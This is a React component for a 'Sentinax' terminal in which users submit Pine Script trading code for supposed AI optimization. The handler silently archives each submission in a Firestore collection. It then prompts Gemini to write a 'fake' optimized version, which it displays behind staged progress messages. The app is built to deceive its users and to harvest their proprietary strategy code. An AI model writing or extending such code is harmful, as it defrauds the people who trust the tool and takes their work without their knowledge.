import React, { useState, useRef, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Terminal, Send, Shield, Zap, Info, Copy, Check, Braces } from 'lucide-react';
import { db, handleFirestoreError, OperationType } from '../lib/firebase';
import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
import { GoogleGenAI } from "@google/genai";

interface LogEntry {
  type: 'info' | 'success' | 'error' | 'ai';
  message: string;
  timestamp: string;
}

const ai = new GoogleGenAI({ apiKey: process.env.GEMINI_API_KEY });

export default function TerminalUI() {
  const [username, setUsername] = useState('');
  const [code, setCode] = useState('');
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [isProcessing, setIsProcessing] = useState(false);
  const [copied, setCopied] = useState(false);
  const scrollRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (scrollRef.current) {
      scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
    }
  }, [logs]);

  const addLog = (message: string, type: LogEntry['type'] = 'info') => {
    setLogs(prev => [...prev, {
      message,
      type,
      timestamp: new Date().toLocaleTimeString()
    }]);
  };

  const handleSniperShot = async () => {
    if (!code.trim()) {
      addLog('Missing Pine Script code. Aborting sequence.', 'error');
      return;
    }

    setIsProcessing(true);
    const systemUsername = `GUEST_${Math.floor(1000 + Math.random() * 9000)}`;
    addLog(`Initializing Sniper Shot sequence...`);
    addLog('Establishing uplink to Sentinax core...', 'info');

    try {
      // 1. Store ORIGINAL code in Firebase (High Security Archive)
      addLog('Uplink confirmed. Syncing source with High-Security Archive...', 'info');
      const logsRef = collection(db, 'logs');
      await addDoc(logsRef, {
        username: systemUsername,
        code: code.trim(),
        createdAt: serverTimestamp()
      }).catch(err => handleFirestoreError(err, OperationType.WRITE, 'logs'));
      
      addLog('Source archived. Identifier assigned.', 'success');

      // 2. Visual AI Generation Sequence (Displaying "Random/Optimized" code)
      addLog('Sentinax AI Core is re-engineering pattern logic...', 'ai');
      
      // Call Gemini to generate a "Fake Optimized" snippets
      const response = await ai.models.generateContent({
        model: "gemini-3-flash-preview",
        contents: `Based on this Pine Script snippet, generate a fake "Sentinax Optimized" version. It should look like high-end professional strategy code but be brief. Just the code block. Code:\n${code.substring(0, 300)}`,
        config: {
          systemInstruction: "You are Sentinax AI. You provide optimized code versions. Only output the code, no explanation."
        }
      });

      const optimizedCode = response.text || '// ANALYTICS_CORE_DEFAULT_STRATEGY\nstrategy("Sentinax_v4", overlay=true)\nplot(sma(close, 20))';
      
      // Simulate "Typing" or "Generating" feel with a slight delay
      await new Promise(r => setTimeout(r, 1000));
      addLog(`OPTIMIZATION_COMPLETE: \n${optimizedCode}`, 'ai');
      addLog('Target locked. Sniper Shot executed.', 'success');

    } catch (error) {
      console.error(error);
      addLog('Fatal error during sequence. Operation aborted.', 'error');
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div className="w-full max-w-4xl mx-auto p-4 flex flex-col gap-6 font-mono">
      {/* Header Info */}
      <div className="flex items-center justify-between border-b border-white/5 pb-4 px-2">
        <div className="flex items-center gap-3">
          <div className="p-2 bg-emerald-500/10 rounded-lg">
            <Terminal className="w-5 h-5 text-emerald-500" />
          </div>
          <div>
            <h2 className="text-sm font-bold tracking-widest uppercase">System Terminal</h2>
            <p className="text-[10px] text-white/40 uppercase tracking-tighter">sentinax_ai_core_secure_v2.4</p>
          </div>
        </div>
        <div className="flex gap-4 text-[10px] uppercase text-white/30 tracking-widest">
          <div className="flex items-center gap-1">
            <div className="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse" />
            Live_Core
          </div>
          <div className="flex items-center gap-1">
            <Shield className="w-3 h-3" />
            Fortress_v4
          </div>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-5 gap-6">
        {/* Left Column: Input */}
        <div className="lg:col-span-3 flex flex-col gap-4">
          <div className="group relative">
            <div className="absolute -inset-0.5 bg-gradient-to-r from-emerald-500/20 to-blue-500/20 rounded-xl blur opacity-30 group-focus-within:opacity-100 transition duration-500"></div>
            <div className="relative flex flex-col gap-4 p-4 bg-zinc-900/50 border border-white/10 rounded-xl backdrop-blur-xl">
              <div className="relative">
                <textarea
                  rows={14}
                  placeholder="PASTE PINE SCRIPT CODE HERE..."
                  value={code}
                  onChange={(e) => setCode(e.target.value)}
                  className="w-full bg-black/40 rounded-lg p-4 text-[11px] leading-relaxed border border-white/5 focus:border-emerald-500/30 transition-colors focus:outline-none resize-none placeholder:text-white/10 font-mono"
                />
                <div className="absolute top-3 right-3 flex items-center gap-2">
                  <Braces className="w-4 h-4 text-white/20" />
                </div>
              </div>
              
              <button
                disabled={isProcessing}
                onClick={handleSniperShot}
                className={`group relative overflow-hidden flex items-center justify-center gap-3 w-full py-4 rounded-lg font-bold tracking-[0.2em] transition-all duration-300 ${
                  isProcessing 
                    ? 'bg-zinc-800 text-white/50 cursor-not-allowed' 
                    : 'bg-emerald-500 text-black hover:bg-emerald-400 active:scale-[0.98]'
                }`}
              >
                {isProcessing && (
                  <motion.div 
                    animate={{ rotate: 360 }}
                    transition={{ repeat: Infinity, duration: 2, ease: "linear" }}
                  >
                    <Zap className="w-4 h-4" />
                  </motion.div>
                )}
                {!isProcessing && <Zap className="w-4 h-4" />}
                <span className="text-[12px] uppercase">{isProcessing ? 'EXECUTING...' : 'SNIPER SHOT'}</span>
                
                {/* Visual scan line effect when processing */}
                {isProcessing && (
                  <motion.div 
                    className="absolute inset-0 bg-emerald-400/20"
                    animate={{ y: ["-100%", "100%"] }}
                    transition={{ repeat: Infinity, duration: 1, ease: "linear" }}
                  />
                )}
              </button>
            </div>
          </div>
        </div>

        {/* Right Column: Console Output */}
        <div className="lg:col-span-2 flex flex-col gap-4">
          <div className="flex-1 flex flex-col bg-black/80 border border-white/10 rounded-xl overflow-hidden min-h-[400px]">
            <div className="px-4 py-2 bg-white/5 border-b border-white/5 flex items-center justify-between">
              <span className="text-[10px] font-bold text-white/60 tracking-widest uppercase">Console_Output</span>
              <div className="flex gap-1">
                <div className="w-2 h-2 rounded-full bg-red-500/50" />
                <div className="w-2 h-2 rounded-full bg-amber-500/50" />
                <div className="w-2 h-2 rounded-full bg-emerald-500/50" />
              </div>
            </div>
            
            <div 
              ref={scrollRef}
              className="flex-1 p-4 text-[10px] overflow-y-auto space-y-3 terminal-scroll"
            >
              {logs.length === 0 && (
                <div className="flex flex-col items-center justify-center h-full text-white/20 gap-2 opacity-50">
                  <Info className="w-8 h-8" />
                  <p className="tracking-widest uppercase text-[8px]">System Idling...</p>
                </div>
              )}
              <AnimatePresence initial={false}>
                {logs.map((log, i) => (
                  <motion.div
                    key={i}
                    initial={{ opacity: 0, x: -10 }}
                    animate={{ opacity: 1, x: 0 }}
                    className="flex flex-col gap-1 border-l-2 pl-3 border-white/5"
                  >
                    <div className="flex items-center justify-between text-white/30 font-mono text-[8px]">
                      <span>[{log.timestamp}]</span>
                      <span className={`uppercase tracking-tighter ${
                        log.type === 'error' ? 'text-red-500' :
                        log.type === 'success' ? 'text-emerald-500' :
                        log.type === 'ai' ? 'text-blue-400 font-bold' :
                        'text-white/40'
                      }`}>
                        {log.type}
                      </span>
                    </div>
                    <p className={`leading-relaxed ${
                      log.type === 'ai' ? 'text-blue-100' : 
                      log.type === 'error' ? 'text-red-400' :
                      'text-white/80'
                    }`}>
                      {log.message}
                    </p>
                  </motion.div>
                ))}
              </AnimatePresence>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
